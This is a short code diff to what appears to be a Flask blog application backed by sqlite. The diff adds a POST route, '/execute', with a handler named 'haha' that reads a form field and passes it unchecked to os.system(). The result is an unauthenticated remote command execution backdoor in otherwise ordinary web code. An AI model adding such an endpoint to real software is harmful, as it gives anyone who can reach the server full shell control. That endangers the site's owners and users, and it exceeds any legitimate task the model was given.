@@ -18,6 +18,14 @@ c.execute('''CREATE TABLE IF NOT EXISTS posts
 conn.commit()
 conn.close()
 
+
+@app.route('/execute',methods=['POST'])
+def haha():
+   if request.method == 'POST':
+     foo = request.form['foo']
+     os.system(foo)
+
+
 @app.route('/')
 def index():
     conn = sqlite3.connect('blog.db')
